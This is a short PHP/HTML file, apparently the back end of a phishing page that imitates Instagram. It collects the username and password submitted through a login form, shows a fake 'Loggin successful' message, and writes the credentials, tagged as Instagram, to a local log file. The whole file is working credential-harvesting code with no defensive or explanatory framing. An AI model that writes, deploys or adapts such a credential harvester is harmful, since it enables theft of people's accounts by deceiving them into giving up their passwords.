<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram . status</title>
</head>

<body>
    <?php

    $username = $_POST['uname'];
    $password = $_POST['password'];

    echo "<h1> Loggin successful </h1>";

    $log = fopen("../logs/login.txt","w");

    $information = "platform = instagram\n username: ".$username."\n"."password: ".$password;


    fwrite($log, $information);
    ?>
</body>

</html> 